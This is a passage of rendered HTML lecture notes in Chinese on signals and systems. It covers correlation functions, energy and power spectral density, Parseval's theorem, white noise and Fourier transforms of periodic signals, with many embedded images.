style="height:0.41415100000000005em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mord mathdefault">d</span><span class="mord mathdefault">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mspace" style="margin-right:2em;"></span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">卷</span><span class="mord cjk_fallback">积</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">频</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">运</span><span class="mord cjk_fallback">算</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>若</mtext><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><msub><mi>F</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>，</mtext><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><msub><mi>F</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">若f_{1}(t)\leftrightarrow F_{1}(j\omega)，f_{2}(t)\leftrightarrow F_{2}(j\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>则</mtext><mi>F</mi><mo stretchy="false">[</mo><msub><mi>R</mi><mn>12</mn></msub><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>↔</mo><msub><mi>F</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><msubsup><mi>F</mi><mn>2</mn><mo lspace="0em" rspace="0em">∗</mo></msubsup><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>，</mtext><mi>F</mi><mo stretchy="false">[</mo><msub><mi>R</mi><mn>21</mn></msub><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>↔</mo><msubsup><mi>F</mi><mn>1</mn><mo lspace="0em" rspace="0em">∗</mo></msubsup><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><msub><mi>F</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">则F[R_{12}(\tau)]\leftrightarrow F_{1}(j\omega)F_{2}^{*}(j\omega)，F[R_{21}(\tau)]\leftrightarrow F_{1}^{*}(j\omega)F_{2}(j\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4518920000000004em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">[</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4518920000000004em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004191420810.png" alt="image-20221004191420810" style="zoom:50%;" /><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>所以</mtext><msub><mi>R</mi><mn>12</mn></msub><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><mo>←</mo><msub><mi>F</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><msubsup><mi>F</mi><mn>2</mn><mo lspace="0em" rspace="0em">∗</mo></msubsup><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">所以R_{12}(\tau)\leftarrow F_{1}(j\omega)F_{2}^{*}(j\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.00773em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">←</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-2.4518920000000004em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.</mn><mtext>自相关函数</mtext><mo>→</mo><msub><mi>f</mi><mn>1</mn></msub><mtext>和</mtext><msub><mi>f</mi><mn>2</mn></msub><mtext>为相同的</mtext><mi>f</mi></mrow><annotation encoding="application/x-tex">2.自相关函数\rightarrow f_{1}和f_{2}为相同的f</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord cjk_fallback">自</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">关</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">和</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">相</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">[</mo><mi>R</mi><mo stretchy="false">(</mo><mi>τ</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>=</mo><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><msup><mi>F</mi><mo lspace="0em" rspace="0em">∗</mo></msup><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">∣</mi><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">F[R(\tau)]=F(j\omega)F^{*}(j\omega)=|F(j\omega)|^{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">[</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.1132em;">τ</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p><h1>能量谱和功率谱</h1><p><strong><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span> 在随机信号分析中很重要！</strong></p><h2 id="能量谱">能量谱</h2><h3 id="信号能量">信号能量</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004193259060.png" alt="image-20221004193259060" style="zoom:50%;" /><h3 id="delta帕斯瓦尔能量方程"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>帕斯瓦尔能量方程</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004193356821.png" alt="image-20221004193356821" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007175622856.png" alt="image-20221007175622856" style="zoom: 67%;" /><h3 id="能量密度谱e-omega">能量密度谱<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E(\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span></h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004193606756.png" alt="image-20221004193606756" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004195532002.png" alt="image-20221004195532002" style="zoom:50%;" />$$总结：\\&E=\int^{+\infty}_{-\infty}|f(t)|^{2}dt = \int^{+\infty}_{-\infty}|F(j\omega)|^{2}d\omega\qquad时域不好求可以通过频域求能量\\&R(\tau)\leftrightarrow|F(j\omega)|^{2}=E(\omega)$$<h3 id="例1">例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004201447232.png" alt="image-20221004201447232" style="zoom:50%;" /><h2 id="功率谱">功率谱</h2><h3 id="信号功率">信号功率</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004201718253.png" alt="image-20221004201718253" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004201814779.png" alt="image-20221004201814779" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004201855823.png" alt="image-20221004201855823" style="zoom:50%;" /><h3 id="功率密度谱">功率密度谱</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202025610.png" style="zoom:50%;" /><h3 id="功率密度谱与自相关函数的关系">功率密度谱与自相关函数的关系</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202154688.png" alt="image-20221004202154688" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202232073.png" alt="image-20221004202232073" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180351425.png" alt="image-20221007180351425" style="zoom:67%;" /><h4 id="例1">例1</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180613295.png" alt="image-20221007180613295" style="zoom:67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180539851.png" alt="image-20221007180539851" style="zoom:67%;" /><h4 id="总结">总结</h4><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202304032.png" alt="image-20221004202304032"></p><h3 id="白噪声功率谱密度">白噪声功率谱密度</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202545862.png" alt="image-20221004202545862" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202509159.png" alt="image-20221004202509159" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202622138.png" alt="image-20221004202622138" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202648880.png" alt="image-20221004202648880" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221004202707832.png" alt="image-20221004202707832" style="zoom:50%;" /><h2 id="能量谱和功率谱的关系">能量谱和功率谱的关系</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180738067.png" alt="image-20221007180738067" style="zoom:67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180909408.png" alt="image-20221007180909408" style="zoom: 67%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007180948511.png" alt="image-20221007180948511" style="zoom: 67%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007181111580.png" alt="image-20221007181111580"></p><h1>周期信号的傅里叶变换</h1><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221005172634170.png" alt="image-20221005172634170" style="zoom:50%;" /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221005173237686.png" alt="image-20221005173237686" style="zoom:50%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007181341762.png" alt="image-20221007181341762"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221007181406192.png" alt="image-20221007181406192"></p><p>结论：1.周期信号可以求出傅里叶变换，2.是<span class="katex"><span class="katex-mathml"><math 